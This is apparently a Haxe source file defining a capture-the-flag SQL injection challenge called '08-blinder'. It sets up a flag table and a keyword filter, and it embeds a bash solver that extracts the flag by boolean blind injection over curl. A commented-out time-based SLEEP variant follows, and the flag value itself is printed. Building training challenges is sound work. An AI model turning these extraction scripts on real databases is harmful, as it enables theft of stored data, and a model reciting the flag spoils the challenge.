package chal.sqli;

class A08Blinder extends Base {
  public function new() {
    super("08-blinder");
    databaseSetup = "CREATE TABLE flag_table (flag TEXT, pw TEXT);"
      + "INSERT INTO flag_table VALUES('emp_like-a-m0le', 'pass=bobot');";
    databaseQuery = [SQL("SELECT 1 FROM flag_table WHERE "), InputFilter([
        Words(["flag_table"], false)
      ])];
    showResults = false;
    flag = "emp_like-a-m0le";
    //resources = [
    //    // sleep
    //    // ternary if
    //  ];

    script = '#!/bin/bash
LOGIN="anonymous"
FLAG=""
for i in {0..30}; do
  for char in {a..z} {0..9} -; do
    curl -X POST -s -b "login=$$LOGIN" \\
      --data-urlencode "query=$$FLAG$$char%" \\
      "http://${Config.http.host}:${Config.http.port}/" | grep "(no results)" >/dev/null
    if [[ "$?" -eq 1 ]]; then
      FLAG="$$FLAG$$char"
      echo "$$FLAG"
    fi
  done
done';
    /*
    script = '#!/bin/bash
LOGIN="anonymous"
FLAG="emp_"
for i in {0..30}; do
  for char in {a..z} {0..9} -; do
    timebefore=`date +%s`
    curl -X POST -s -b "login=$$LOGIN" \\
      --data-urlencode "query=IF(flag LIKE \'$$FLAG$$char%\', SLEEP(3), 0)" \\
      "http://${Main.HOST}:${Main.PORT}/" >/dev/null
    timeafter=`date +%s`
    if [[ timeafter -ge $((timebefore + 2)) ]]; then
      FLAG="$$FLAG$$char"
      echo "$$FLAG"
    fi
  done
done';
    */
  }
}
